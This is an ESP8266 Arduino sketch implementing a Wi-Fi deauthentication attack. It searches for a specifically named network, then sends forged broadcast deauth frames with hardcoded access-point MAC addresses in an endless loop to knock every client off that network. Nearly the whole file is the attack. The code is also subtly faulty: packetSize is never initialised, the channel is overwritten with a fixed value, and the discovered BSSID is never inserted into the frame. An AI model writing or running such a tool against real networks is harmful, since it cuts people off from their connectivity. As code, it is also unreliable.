#include <ESP8266WiFi.h>

extern "C" {
#include "user_interface.h"
}

#define NUMNET 30
#define MAC_ADDR_LEN 6

uint8_t numNetworks = 0;
uint8_t* knownBSSIDS[NUMNET];
bool found;

uint8_t targetBSSID[MAC_ADDR_LEN];
uint8_t targetChannel = 2;
const char* targetSSID = "bowenIntranetFibre";

uint8_t packetSize;

// uint8_t deauthPacket[26] = {
// /*0 - 1*/  0xC0, 0x00, // Frame Control
// /*2 - 3*/  0x00, 0x00, // Duration
// /*4 - 9*/  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast) (all 0xFF means to everyone instead of a specific device)
// /*10 - 15*/  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP MAC)
// /*16 - 21*/  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP MAC)
// /*22 - 23*/  0xFF, 0xFF, // Fragment & Sequence number
// /*24 - 25*/  0x01, 0x00  // Reason code 1 (no reason given)
// };

uint8_t deauthPacket[26] = {
  /*0 - 1*/  0xC0, 0x00, // Frame Control
  /*2 - 3*/  0x00, 0x00, // Duration
  /*4 - 9*/  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast) (all 0xFF means to everyone instead of a specific device)
  /*10 - 15*/  0xbc, 0xc7, 0x46, 0xff, 0x2e, 0xd4, // Source (AP MAC)
  /*16 - 21*/  0xe4, 0xfa, 0xc4, 0xce, 0x6b, 0xfa, // BSSID (AP MAC)
  /*22 - 23*/  0xFF, 0xFF, // Fragment & Sequence number
  /*24 - 25*/  0x01, 0x00  // Reason code 1 (no reason given)
};

void setup() {
  Serial.begin(115200);
  Serial.println("");
  Serial.printf("Deauthing %s\n", targetSSID);
  found = false;

  wifi_promiscuous_enable(1);

  delay(100);
}

void loop() {
  if(!found){
    Serial.println("Trying to find target...");
    findNewNetworks();
  }else{
    Serial.println("Deauthing...");
    deauthAttack(targetBSSID);
  }
  
  delay(20);
}
// void deauthAttack() {
void deauthAttack(uint8_t* apMac) {
  targetChannel = 7;
  wifi_set_channel(targetChannel);//same channel as target AP
  uint8_t newPacket[packetSize];
  memcpy(newPacket, deauthPacket, packetSize);

  // memcpy(&newPacket[10], apMac, MAC_ADDR_LEN);
  // memcpy(&newPacket[16], apMac, MAC_ADDR_LEN);

  while (true){
    if(wifi_send_pkt_freedom(newPacket, 26, 0) != 0){
      Serial.println("DEAUTH PACKET SENT");
    }else{
      Serial.println("DEAUTH PACKET FAILED");
    }
    delay(20);  // Adjust delay as needed
  }
}

void restart(){
  for(uint8_t i =0 ; i < numNetworks; i++){
    free(knownBSSIDS[i]);
  }
  numNetworks = 0;
  Serial.println("Memory Resetted.");
}

void findNewNetworks(){
  uint8_t foundNetworks = WiFi.scanNetworks();

  // loop all found networks
  for (uint8_t i = 0; i < foundNetworks; i++){
    
    uint8_t* newBSSID = WiFi.BSSID(i);
    bool newNetwork = true;

    // if any found networks have been seen before
    for (uint8_t k = 0; k < numNetworks; k++){
      if(memcmp(newBSSID, knownBSSIDS[k], MAC_ADDR_LEN) == 0){
        newNetwork = false;
        break;
      }
    }

    // new network confirmed, add to list of known networks
    if(newNetwork){
      if (numNetworks < NUMNET) {
        knownBSSIDS[numNetworks] = (uint8_t*)malloc(MAC_ADDR_LEN * sizeof(uint8_t));
        memcpy(knownBSSIDS[numNetworks], newBSSID, MAC_ADDR_LEN);
        numNetworks++;
      }else{
        printf("All network slots filled. Restarting");
        restart();
        return;
      }

      Serial.println("\nNew Network found");
      Serial.printf("SSID   : %s\n", WiFi.SSID(i).c_str());
      Serial.printf("BSSID  : %s\n", WiFi.BSSIDstr(i).c_str());
      Serial.printf("Channel: %d\n", WiFi.channel(i));

      if(strcmp(WiFi.SSID(i).c_str(), targetSSID) == 0){
        Serial.println("bowenIntranetFibre FOUND");

        found = true;
        memcpy(targetBSSID, newBSSID, MAC_ADDR_LEN);
        targetChannel = WiFi.channel(i);
        break;
      }
    }
  }
}